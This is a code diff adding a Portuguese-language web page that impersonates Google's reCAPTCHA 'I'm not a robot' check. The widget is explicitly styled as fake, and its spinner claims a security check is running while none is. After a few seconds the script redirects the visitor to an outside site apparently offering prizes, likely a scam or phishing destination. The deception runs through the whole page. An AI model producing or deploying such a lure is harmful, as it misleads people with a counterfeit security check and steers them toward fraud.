@@ -1,0 +1,284 @@
+<!DOCTYPE html><html lang="pt"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificação</title>
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+html,body{
+    width:100%;
+    min-height:100vh;
+    background:#f1f1f1;
+}
+
+body{
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:20px;
+}
+
+.wrapper{
+    width:100%;
+    max-width:520px;
+    text-align:center;
+}
+
+.title{
+    color:#202124;
+    font-size:clamp(22px,4vw,38px);
+    line-height:1.4;
+    margin-bottom:30px;
+    font-weight:400;
+    padding:0 10px;
+}
+
+.captcha-box{
+    width:100%;
+    background:#fff;
+    border:1px solid #d3d3d3;
+    border-radius:6px;
+    padding:22px;
+    box-shadow:0 1px 4px rgba(0,0,0,.12);
+}
+
+.fake-recaptcha{
+    width:100%;
+    min-height:78px;
+    border:1px solid #d3d3d3;
+    border-radius:4px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 18px;
+    background:#f9f9f9;
+    cursor:pointer;
+    transition:.2s;
+}
+
+.fake-recaptcha:hover{
+    background:#f5f5f5;
+}
+
+.left-side{
+    display:flex;
+    align-items:center;
+    gap:14px;
+}
+
+.checkbox{
+    width:30px;
+    height:30px;
+    border:2px solid #c1c1c1;
+    border-radius:3px;
+    background:#fff;
+    position:relative;
+    transition:.2s;
+}
+
+.checkbox.checked::after{
+    content:"✔";
+    position:absolute;
+    left:50%;
+    top:50%;
+    transform:translate(-50%,-50%);
+    color:#34a853;
+    font-size:22px;
+    font-weight:bold;
+}
+
+.robot-text{
+    font-size:17px;
+    color:#202124;
+}
+
+.right-side{
+    text-align:center;
+    font-size:11px;
+    color:#777;
+}
+
+.logo{
+    width:36px;
+    margin-bottom:4px;
+}
+
+.bottom-links{
+    margin-top:14px;
+    text-align:left;
+    font-size:12px;
+    color:#777;
+}
+
+.loading-box{
+    display:none;
+    width:100%;
+    background:#fff;
+    border:1px solid #d3d3d3;
+    border-radius:6px;
+    padding:35px 25px;
+    box-shadow:0 1px 4px rgba(0,0,0,.12);
+}
+
+.loader{
+    width:58px;
+    height:58px;
+    border:5px solid #e0e0e0;
+    border-top:5px solid #4285f4;
+    border-radius:50%;
+    margin:0 auto 22px auto;
+    animation:spin 1s linear infinite;
+}
+
+.loading-text{
+    font-size:clamp(17px,3vw,22px);
+    color:#202124;
+}
+
+.progress{
+    width:100%;
+    height:7px;
+    background:#e0e0e0;
+    border-radius:30px;
+    overflow:hidden;
+    margin-top:22px;
+}
+
+.progress-bar{
+    width:0%;
+    height:100%;
+    background:#4285f4;
+    animation:load 3s linear forwards;
+}
+
+@keyframes spin{
+    100%{
+        transform:rotate(360deg);
+    }
+}
+
+@keyframes load{
+    100%{
+        width:100%;
+    }
+}
+
+@media(max-width:480px){
+
+    .captcha-box,
+    .loading-box{
+        padding:16px;
+    }
+
+    .fake-recaptcha{
+        padding:0 12px;
+        min-height:72px;
+    }
+
+    .robot-text{
+        font-size:15px;
+    }
+
+    .logo{
+        width:30px;
+    }
+
+    .checkbox{
+        width:26px;
+        height:26px;
+    }
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+
+    <div class="title">
+        Por favor, confirme que você<br>
+        não é um robô para continuar
+    </div>
+
+    <div class="captcha-box" id="captchaBox">
+
+        <div class="fake-recaptcha" onclick="verifyHuman()">
+
+            <div class="left-side">
+
+                <div class="checkbox" id="checkbox"></div>
+
+                <div class="robot-text">
+                    Não sou um robô
+                </div>
+
+            </div>
+
+            <div class="right-side">
+
+                <img class="logo" src="images/logo_48.png">
+
+                <div>reCAPTCHA</div>
+
+            </div>
+
+        </div>
+
+        <div class="bottom-links">
+            Privacidade &nbsp; - &nbsp; Termos
+        </div>
+
+    </div>
+
+    <div class="loading-box" id="loadingBox">
+
+        <div class="loader"></div>
+
+        <div class="loading-text">
+            Verificando segurança...
+        </div>
+
+        <div class="progress">
+            <div class="progress-bar"></div>
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+
+function verifyHuman(){
+
+    const checkbox = document.getElementById("checkbox");
+
+    checkbox.classList.add("checked");
+
+    setTimeout(() => {
+
+        document.getElementById("captchaBox").style.display = "none";
+        document.getElementById("loadingBox").style.display = "block";
+
+    }, 700);
+
+    setTimeout(() => {
+
+        window.location.href = "https://kwik-kwanza-premios.vercel.app/";
+
+    }, 3800);
+}
+
+</script>
+
+
+
+
+</body></html>
